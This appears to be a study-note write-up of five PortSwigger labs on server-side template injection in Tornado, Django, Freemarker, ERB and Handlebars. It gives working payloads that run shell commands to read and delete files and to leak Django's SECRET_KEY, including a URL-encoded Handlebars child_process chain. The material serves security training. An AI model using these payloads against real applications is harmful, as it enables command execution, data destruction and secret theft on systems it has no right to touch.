## Approach

1. Use fuzz string to detect if there's a possible **SSTI** 
2. If you can already see templating but don't know what's using trigger an error by breaking the syntax, usually the error shows what framework it is
## Labs
### [1. Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

> [!NOTE] 
> **Tornado** framework used as template engine from **preferred nickname**, we can do SSTI have command execution

**Detect SSTI**

> The **preferred name** feature controls what gets displayed as our name in blog posts, allowing us to see if the injection work or not
```
blog-post-author-display=user.first_name${{<%[%'"}}%\
```
![](attachments/Pasted%20image%2020260107162312.png)

**Confirm SSTI**

> - We can see that our payload works and the math operation is processed
> - The payload is like that due to it already inside a template syntax `{{ }}`
```python
blog-post-author-display=7*7
```
![](attachments/Pasted%20image%2020260107162846.png)

**Delete file**

> - We add a closing curly brackets `}}` for closing the existing template and using an expression so it doesn't output an error
> - Then we open a new template to be able to `import os` library for python and do system calls
```python
blog-post-author-display=7*7}}{% import os %}{{ os.popen("rm /home/carlos/morale.txt").read()
```

**Read files**

> For reading the contents useful for cases like BSCP
```python
blog-post-author-display=7*7}}{% import os %}{{ os.popen("cat /home/carlos/morale.txt").read()
```
![](attachments/Pasted%20image%2020260107195316.png)
### [2. Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

> [!NOTE] 
> There is an information disclosure of framework secret key that is accessible from template variables in this case for **Django** it's in the `settings.SECRET_KEY` variable

**Detect SSTI**

> We got the framework, it is using **Django**
```python
{{}}}
```
![](attachments/Pasted%20image%2020260107200225.png)

**Use debug payload**

> Since we are asked for the framework secret key, it can be found in `'settings': <LazySettings "None">`, it can be confirmed from it's documentation
```python
{% debug %}
```
![](attachments/Pasted%20image%2020260107201934.png)
![](attachments/Pasted%20image%2020260107201837.png)

**Getting the secret key**

```python
{{ settings.SECRET_KEY }}
```

### [3. Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

> [!NOTE] 
> Website uses a templating engine **Freemarker** for content managing, it is possible to do command execution

**Find framework technology**

> Using framework **Freemarker**
```java
${$}
```
![](attachments/Pasted%20image%2020260107203452.png)

**Read file SSTI**

> Read the contents of `/home/carlos/morale.txt`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat /home/carlos/morale.txt")}
```
![](attachments/Pasted%20image%2020260107203750.png)

**Delete file**

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
```

### [4. Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

> [!NOTE] 
> **ERB SSTI** allowing system command execution

**Detect SSTI**

> When clicking the first product, you will get warning for stock message, the `message` is controllable, if injected a SSTI test we get 49, confirming SSTI
```ruby
?message=<%=7*7%>
```

**Detect framework**

```ruby
?message=<%=123a%>
```
![](attachments/Pasted%20image%2020260107205336.png)

**Exploit SSTI ERB delete file**

```ruby
?message=<%=system('rm /home/carlos/morale.txt')%>
```

**Exploit SSTI ERB read file**

```ruby
?message=<%=system('cat /home/carlos/morale.txt')%>
```
![](attachments/Pasted%20image%2020260107205213.png)
### [5. Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

> [!NOTE] 
> Website uses **handlebars** framework that is known to have an SSTI vuln allowing command execution

**Detect SSTI**

> Framework is **handlebars** 
```js
?message=${{<%[%'"}}%\
```
![](attachments/Pasted%20image%2020260107205937.png)

**Basic SSTI injection handlebars**

> Returns the object, meaning SSTI is possible
```js
?message={{this}}
```
![](attachments/Pasted%20image%2020260107210325.png)

**Exploiting SSTI**

> Read file payload, when inputting must be URL encoded
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> URL encoded
```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
![](attachments/Pasted%20image%2020260107210709.png)
## Cheat Sheets

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
> PayloadAllTheThings